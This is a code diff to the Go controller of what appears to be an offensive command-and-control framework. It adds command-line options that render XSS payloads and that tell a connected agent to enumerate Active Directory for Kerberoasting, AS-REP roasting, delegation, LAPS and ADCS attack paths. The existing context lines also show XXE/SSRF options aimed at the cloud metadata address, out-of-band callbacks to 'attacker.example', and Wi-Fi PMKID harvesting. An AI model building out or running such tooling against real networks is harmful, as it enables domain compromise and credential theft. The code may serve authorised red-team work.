@@ -146,6 +146,16 @@ func main() {
 	webXXEURL := flag.String("webxxe-url", "http://169.254.169.254/latest/meta-data/", "URL for SSRF payloads")
 	webXXEAttacker := flag.String("webxxe-attacker", "attacker.example", "attacker host for OOB callbacks")
 	webXXEDefaults := flag.Bool("webxxe-defaults", false, "sweep the default file + URL list")
+	webXSS := flag.String("webxss", "", "render XSS payloads for a context: html|attribute|url|script|css|dom|jsonp|markdown|all")
+	webXSSJS := flag.String("webxss-js", "alert(1)", "JS body to substitute into {JS}")
+	webXSSFPs := flag.Bool("webxss-fingerprints", false, "list framework fingerprint markers instead")
+	adEnum := flag.String("adenum", "", "AD enumeration action: rootdse|domain|users|groups|computers|gpos|trusts|asrep|kerberoast|unconstrained|pwdnotreq|laps|adcs")
+	adHost := flag.String("ad-host", "", "domain controller ip/hostname")
+	adPort := flag.Int("ad-port", 389, "LDAP port (389 or 636)")
+	adTLS := flag.Bool("ad-tls", false, "use LDAPS")
+	adBindDN := flag.String("ad-bind-dn", "", "LDAP bind DN")
+	adBindPW := flag.String("ad-bind-pw", "", "LDAP bind password")
+	adBaseDN := flag.String("ad-base-dn", "", "search base (auto via RootDSE if empty)")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -504,6 +514,19 @@ func main() {
 			Context: *webXSS,
 			JS:      *webXSSJS,
 			FPs:     *webXSSFPs,
+		})
+	}
+
+	// adenum dispatch — AD enumeration via the first agent
+	if *adEnum != "" {
+		go runAdEnumDispatch(mgr, adEnumArgs{
+			Action: *adEnum,
+			Host:   *adHost,
+			Port:   *adPort,
+			TLS:    *adTLS,
+			BindDN: *adBindDN,
+			BindPW: *adBindPW,
+			BaseDN: *adBaseDN,
 		})
 	}
 
@@ -1291,5 +1314,41 @@ func runWebXXEDispatch(mgr *session.Manager, a webXXEArgs) {
 	}
 	if err := s.SendWebXXEStart(sessionID, req); err != nil {
 		log.Printf("[webxxe] start: %v", err)
+	}
+}
+
+// adEnumArgs carries the operator's -ad* flags.
+type adEnumArgs struct {
+	Action string
+	Host   string
+	Port   int
+	TLS    bool
+	BindDN string
+	BindPW string
+	BaseDN string
+}
+
+// runAdEnumDispatch waits for the first agent, fires an AdEnumStart.
+func runAdEnumDispatch(mgr *session.Manager, a adEnumArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("ad-%d", time.Now().UnixNano())
+
+	log.Printf("[adenum] %s @ %s:%d -> %s", a.Action, a.Host, a.Port, s.AgentID)
+
+	req := proto.AdEnumStart{
+		SessionID: sessionID,
+		Action:    a.Action,
+		Host:      a.Host,
+		Port:      a.Port,
+		UseTLS:    a.TLS,
+		BindDN:    a.BindDN,
+		BindPW:    a.BindPW,
+		BaseDN:    a.BaseDN,
+	}
+	if err := s.SendAdEnumStart(sessionID, req); err != nil {
+		log.Printf("[adenum] start: %v", err)
 	}
 }
